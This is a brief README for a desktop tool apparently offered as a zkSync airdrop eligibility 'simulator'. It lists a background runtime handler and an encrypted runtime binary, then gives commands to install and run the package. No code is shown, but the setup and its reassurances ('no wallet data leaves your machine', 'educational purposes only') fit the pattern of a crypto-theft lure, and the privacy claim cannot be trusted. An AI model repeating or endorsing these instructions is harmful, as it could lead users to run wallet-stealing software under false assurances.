# zkSync Wallet Eligibility Checker (Desktop GUI)

A lightweight desktop tool to simulate airdrop eligibility checks for zkSync wallets.  
Ideal for crypto enthusiasts tracking their wallet activity across chains.

## Features
- Simple, intuitive graphical interface
- No command-line required
- Simulated zkSync airdrop result display
- Offline support — no wallet data leaves your machine
- Export results to file

## Structure
- `zk_gui.py` — graphical interface script
- `zk_services.py` — background runtime handler
- `zk_module.dat` — encrypted runtime binary
- `ZK_Checker_Guide.pdf` — user guide
- `requirements.txt` — Tkinter requirement

## Installation
1. Make sure you have Python 3.9+ installed
2. Run the following:

```bash
pip install -r requirements.txt
python zk_gui.py
```

## Note
This tool is for simulation and educational purposes only.
